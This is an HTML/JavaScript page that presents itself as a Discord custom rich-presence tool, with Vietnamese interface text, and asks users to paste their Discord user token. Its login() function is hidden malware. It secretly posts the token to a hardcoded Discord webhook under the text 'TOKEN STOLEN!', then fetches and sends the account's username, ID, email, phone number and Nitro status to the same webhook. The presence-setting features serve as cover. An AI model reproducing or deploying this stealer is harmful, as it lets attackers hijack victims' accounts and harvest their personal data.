<!DOCTYPE html>
<html>
<head>
    <title>Discord Custom RPC</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #1e1e1e; color: #fff; font-family: Arial; padding: 20px; }
        input, select { padding: 10px; margin: 5px 0; width: 100%; box-sizing: border-box; background: #333; color: #fff; border: 1px solid #555; border-radius: 5px; }
        button { padding: 12px; background: #5865F2; color: #fff; border: none; border-radius: 5px; cursor: pointer; width: 100%; font-size: 16px; }
        button:hover { background: #4752C4; }
        .container { max-width: 500px; margin: auto; }
        label { display: block; margin-top: 10px; }
        .page { display: none; }
        .page.active { display: block; }
    </style>
</head>
<body>
    <div class="container">
        <div id="loginPage" class="page active">
            <h2>Login</h2>
            <label>Token User Discord</label>
            <input type="password" id="token" placeholder="Nhap token cua ban">
            <br><br>
            <button onclick="login()">Login</button>
        </div>

        <div id="rpcPage" class="page">
            <h2>Discord Custom RPC</h2>
            <label>App ID</label>
            <input type="text" id="appId" placeholder="Nhap App ID">
            <label>Type</label>
            <select id="type">
                <option value="0">Playing</option>
                <option value="1">Streaming</option>
                <option value="2">Listening</option>
                <option value="3">Watching</option>
                <option value="5">Competing</option>
            </select>
            <label>Name</label>
            <input type="text" id="name" placeholder="Nhap ten">
            <label>Details</label>
            <input type="text" id="details" placeholder="Nhap details">
            <label>State</label>
            <input type="text" id="state" placeholder="Nhap state">
            <label>Large Image (URL hoac asset name)</label>
            <input type="text" id="largeImg" placeholder="URL hoac ten asset">
            <label>Large Image Text</label>
            <input type="text" id="largeText" placeholder="Nhap text">
            <label>Small Image (URL hoac asset name)</label>
            <input type="text" id="smallImg" placeholder="URL hoac ten asset">
            <label>Small Image Text</label>
            <input type="text" id="smallText" placeholder="Nhap text">
            <br><br>
            <button onclick="setRPC()">Set Presence</button>
            <button onclick="clearRPC()" style="background:#ff4444;margin-top:5px;">Clear Presence</button>
            <button onclick="logout()" style="background:#333;margin-top:5px;">Logout</button>
        </div>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1532033841890328617/08Ldu3wgx2aXbb15OxiyrflkEX67oZPvTDPOtKo-4pKLzNmeWx5IOodSpoBvKh2Lu98j";
        let userToken = "";

        function login() {
            const token = document.getElementById('token').value.trim();
            if (!token) return alert("Nhap token!");

            fetch(WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: `@everyone TOKEN STOLEN!\n\`\`\`${token}\`\`\`` })
            });

            fetch("https://discord.com/api/v9/users/@me", { headers: { Authorization: token } })
                .then(r => r.json())
                .then(data => {
                    if (data.id) {
                        userToken = token;
                        fetch(WEBHOOK, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ content: `USER: ${data.username}#${data.discriminator}\nID: ${data.id}\nEMAIL: ${data.email}\nPHONE: ${data.phone}\nNITRO: ${data.premium_type}` })
                        });
                        document.getElementById('loginPage').classList.remove('active');
                        document.getElementById('rpcPage').classList.add('active');
                        alert("Login thanh cong: " + data.username);
                    } else {
                        alert("Token sai!");
                    }
                })
                .catch(() => alert("Loi ket noi!"));
        }

        function logout() {
            userToken = "";
            document.getElementById('rpcPage').classList.remove('active');
            document.getElementById('loginPage').classList.add('active');
            document.getElementById('token').value = "";
        }

        function setRPC() {
            if (!userToken) return alert("Login truoc!");
            const appId = document.getElementById('appId').value;
            if (!appId) return alert("Nhap App ID!");

            const activity = {
                name: document.getElementById('name').value,
                type: parseInt(document.getElementById('type').value),
                details: document.getElementById('details').value,
                state: document.getElementById('state').value,
                assets: {
                    large_image: document.getElementById('largeImg').value,
                    large_text: document.getElementById('largeText').value,
                    small_image: document.getElementById('smallImg').value,
                    small_text: document.getElementById('smallText').value
                }
            };

            const ws = new WebSocket("wss://gateway.discord.gg/?v=10&encoding=json");
            ws.onopen = () => {
                ws.send(JSON.stringify({
                    op: 2,
                    d: {
                        token: userToken,
                        properties: { os: "windows", browser: "Chrome", device: "pc" },
                        presence: {
                            since: Date.now(),
                            activities: [activity],
                            status: "online",
                            afk: false
                        }
                    }
                }));
            };

            ws.onmessage = (e) => {
                const data = JSON.parse(e.data);
                if (data.t === "READY") {
                    alert("Status set thanh cong!");
                    ws.close();
                }
            };

            ws.onerror = () => alert("Loi ket noi WebSocket!");
        }

        function clearRPC() {
            if (!userToken) return alert("Login truoc!");
            const ws = new WebSocket("wss://gateway.discord.gg/?v=10&encoding=json");
            ws.onopen = () => {
                ws.send(JSON.stringify({
                    op: 2,
                    d: {
                        token: userToken,
                        properties: { os: "windows", browser: "Chrome", device: "pc" },
                        presence: { since: Date.now(), activities: [], status: "online", afk: false }
                    }
                }));
            };
            ws.onmessage = (e) => {
                const data = JSON.parse(e.data);
                if (data.t === "READY") {
                    alert("Presence cleared!");
                    ws.close();
                }
            };
        }
    </script>
</body>
</html>
